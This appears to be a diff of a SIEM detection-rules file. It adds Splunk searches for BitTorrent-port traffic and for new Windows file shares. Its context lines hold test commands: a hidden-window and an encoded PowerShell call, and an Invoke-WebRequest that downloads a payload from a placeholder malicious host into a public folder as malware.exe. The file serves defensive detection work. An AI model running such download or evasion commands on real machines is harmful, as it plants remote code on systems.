@@ -48,6 +48,19 @@ index=windows AND source="WinEventLog:Security" AND EventCode=4688 AND new_proce
 
 
 powershell.exe -WindowStyle Hidden -Command "Write-Output 'Simulating hidden window'"
+
+index=fortinet AND dstport IN (6881, 6882, 6883, 6884, 6885, 6886, 6887, 6888, 6889) AND NOT srcip IN (10.51.120.132)
+| stats count by srcip dstip dstport
+| eval severity = "Medium" 
+| where count > 50
+| table srcip dstip dstport count severity
+
+
+
+index=windows AND source="WinEventLog:Security" AND EventCode=5142 AND NOT Share_Name IN ("\\*\IPC$","\\*\ADMIN$","\\*\C$","\\*\SYSVOL","")
+| eval severity = "Medium"
+| rename dvc_nt_host AS dvc
+| table dvc user severity
 powershell.exe -EncodedCommand SQBFAFgA
 Invoke-WebRequest -Uri "http://malicious-example.com/payload" -OutFile "C:\Users\Public\malware.exe"
 
